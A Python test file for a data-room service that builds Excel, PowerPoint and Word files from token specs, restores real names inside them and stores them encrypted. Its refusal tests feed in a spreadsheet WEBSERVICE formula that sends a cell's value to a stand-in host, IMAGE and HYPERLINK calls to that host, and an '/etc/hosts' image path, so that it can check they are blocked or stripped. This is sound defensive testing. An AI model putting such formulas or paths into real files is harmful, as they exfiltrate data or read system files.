"""Files built on the deck (docs/data-room-plan.md P4): Claude sends a
workbook, deck or document as a spec in tokens; the deck builds it from the
token spec, puts the names back inside the file, and keeps it for the owner.
No pictures, no links, no formulas that reach outside. Made-up data."""

from __future__ import annotations

import io
import json
import zipfile

import docx
import openpyxl
import pptx
import pytest

from captain_claw.flight_deck import rooms_store
from test_flight_deck.test_rooms import ALICE, ALICE_H, EMAIL, deck  # noqa: F401 — the deck fixture
from test_flight_deck.test_rooms_mcp import _client, _released_room, _rooms_token, _tool


async def _room(c):
    room = await _released_room(c)
    await rooms_store.store().set_grant(ALICE, "cc_oc_test", [room["id"]], False)
    return room


def _members(blob: bytes) -> dict[str, bytes]:
    z = zipfile.ZipFile(io.BytesIO(blob))
    return {n: z.read(n) for n in z.namelist()}


@pytest.mark.usefixtures("deck")
async def test_a_workbook_is_built_and_the_names_go_back_inside():
    async with _client() as c:
        room = await _room(c)
        receipt = await _tool(c, _rooms_token(), "room_deliver_workbook", room=room["id"], title="Model ⟦PERSON_1⟧",
                              sheets=[
                                  {"name": "⟦PERSON_1⟧ model", "header": True,
                                   "rows": [["Stavka", "EUR k"], ["Prihod", "13980"], ["Kontakt", "⟦EMAIL_1⟧"]]},
                                  {"name": "Sažetak", "rows": [["Dvostruko", "='⟦PERSON_1⟧ model'!B2*2"]]},
                              ], edits=[{"op": "format", "sheet": "⟦PERSON_1⟧ model", "range": "B2",
                                         "number_format": "#,##0"}])
        assert receipt["delivered"] == "#1" and receipt["file"] == "Excel workbook (.xlsx)"
        assert receipt["restored"] >= 3 and "Ana" not in json.dumps(receipt)

        d = (await c.get(f"/fd/rooms/{room['id']}/deliveries/1", headers=ALICE_H)).json()
        assert d["title"] == "Model Ana Kovač" and d["report"]["kind"] == "workbook"
        assert "Ana Kovač" in d["body"] and "⟦PERSON_1⟧" in d["body_tokens"]
        got = await c.get(f"/fd/rooms/{room['id']}/deliveries/1/download", params={"as": "file"}, headers=ALICE_H)
        assert got.status_code == 200 and "Model" in got.headers["content-disposition"]
        wb = openpyxl.load_workbook(io.BytesIO(got.content))
        assert wb.sheetnames == ["Ana Kovač model", "Sažetak"]
        first = wb["Ana Kovač model"]
        assert first["B2"].value == 13980 and first["A3"].value == "Kontakt" and first["B3"].value == EMAIL
        assert wb["Sažetak"]["B1"].value == "='Ana Kovač model'!B2*2"  # the formula followed the sheet
        # The copy at rest is encrypted.
        files = list((rooms_store.store().room_dir(room["id"]) / "inbox").iterdir())
        assert files and all(b"Ana" not in f.read_bytes() for f in files)


@pytest.mark.usefixtures("deck")
async def test_formulas_that_reach_outside_are_refused():
    async with _client() as c:
        room = await _room(c)
        t = _rooms_token()
        for formula in ('=WEBSERVICE("https://x.example/?q="&A1)', '=IMAGE("https://x.example/a.png")',
                        '=HYPERLINK("https://x.example","x")', "='[budget.xlsx]Sheet1'!A1"):
            out = await _tool(c, t, "room_deliver_workbook", room=room["id"], title="x",
                              sheets=[{"name": "S", "rows": [["⟦PERSON_1⟧", formula]]}])
            assert "reach outside" in out["error"], formula
        ok = await _tool(c, t, "room_deliver_workbook", room=room["id"], title="x",
                         sheets=[{"name": "S", "rows": [["1", "2", "=SUM(A1:B1)"]]}])
        assert ok["delivered"]


@pytest.mark.usefixtures("deck")
async def test_a_deck_without_pictures_or_links():
    async with _client() as c:
        room = await _room(c)
        receipt = await _tool(c, _rooms_token(), "room_deliver_deck", room=room["id"], title="Pregled ⟦PERSON_1⟧",
                              slides=[
                                  {"title": "⟦PERSON_1⟧ — pregled", "body": "- Rast prihoda\n- Kontakt ⟦EMAIL_1⟧",
                                   "notes": "Pitati ⟦PERSON_1⟧ o ugovoru."},
                                  {"title": "Logo", "image": "/etc/hosts",
                                   "body": "[stranica](https://x.example/?q=⟦PERSON_1⟧)"},
                              ])
        assert receipt["delivered"] == "#1"
        joined = " ".join(receipt["notes"])
        assert "pictures were left out" in joined and "link(s) were turned into plain text" in joined
        got = await c.get(f"/fd/rooms/{room['id']}/deliveries/1/download", params={"as": "file"}, headers=ALICE_H)
        prs = pptx.Presentation(io.BytesIO(got.content))
        texts = [sh.text_frame.text for s in prs.slides for sh in s.shapes if sh.has_text_frame]
        assert "Ana Kovač — pregled" in texts and any(EMAIL in t for t in texts)
        assert prs.slides[0].notes_slide.notes_text_frame.text == "Pitati Ana Kovač o ugovoru."
        members = _members(got.content)
        assert not any("/media/" in n for n in members)
        assert not any(b"x.example" in v for k, v in members.items() if k.endswith(".rels"))


@pytest.mark.usefixtures("deck")
async def test_a_document_from_markdown():
    async with _client() as c:
        room = await _room(c)
        receipt = await _tool(c, _rooms_token(), "room_deliver_document", room=room["id"], title="Memo ⟦PERSON_1⟧",
                              markdown="# Memo\n\n⟦PERSON_1⟧ potpisuje.\n\n![logo](/etc/hosts)\n\n"
                                       "[web](https://x.example/?q=⟦PERSON_1⟧)\n", page_numbers=True)
        assert receipt["file"] == "Word document (.docx)"
        got = await c.get(f"/fd/rooms/{room['id']}/deliveries/1/download", params={"as": "docx"}, headers=ALICE_H)
        assert got.status_code == 200
        text = "\n".join(p.text for p in docx.Document(io.BytesIO(got.content)).paragraphs)
        assert "Ana Kovač potpisuje" in text and "web" in text
        members = _members(got.content)
        assert not any("/media/" in n for n in members)
        assert not any(b"x.example" in v for v in members.values())


@pytest.mark.usefixtures("deck")
async def test_a_real_value_in_a_file_is_kept_from_claude():
    async with _client() as c:
        room = await _room(c)
        receipt = await _tool(c, _rooms_token(), "room_deliver_workbook", room=room["id"], title="Popis",
                              sheets=[{"name": "S", "rows": [["⟦PERSON_1⟧", "Ana Kovač"]]}])
        assert set(receipt) == {"delivered", "file", "restored", "note"}
        d = (await c.get(f"/fd/rooms/{room['id']}/deliveries/1", headers=ALICE_H)).json()
        assert d["report"]["real_values"] == ["⟦PERSON_1⟧"]


@pytest.mark.usefixtures("deck")
async def test_build_errors_speak_tokens_and_delete_removes_the_files():
    async with _client() as c:
        room = await _room(c)
        t = _rooms_token()
        bad = await _tool(c, t, "room_deliver_workbook", room=room["id"], title="x", sheets=[])
        assert "sheets is required" in bad["error"]
        assert "slides is required" in (await _tool(c, t, "room_deliver_deck", room=room["id"], title="x",
                                                    slides=[]))["error"]
        await _tool(c, t, "room_deliver_document", room=room["id"], title="x", markdown="⟦PERSON_1⟧")
        inbox = rooms_store.store().room_dir(room["id"]) / "inbox"
        assert len(list(inbox.iterdir())) == 2
        assert (await c.get(f"/fd/rooms/{room['id']}/deliveries/1/download", params={"as": "file"},
                            headers=ALICE_H)).status_code == 200
        await c.delete(f"/fd/rooms/{room['id']}/deliveries/1", headers=ALICE_H)
        assert list(inbox.iterdir()) == []
        text = await _tool(c, t, "room_deliver", room=room["id"], title="t", content="⟦PERSON_1⟧")
        assert (await c.get(f"/fd/rooms/{room['id']}/deliveries/{text['delivered'][1:]}/download",
                            params={"as": "file"}, headers=ALICE_H)).status_code == 422
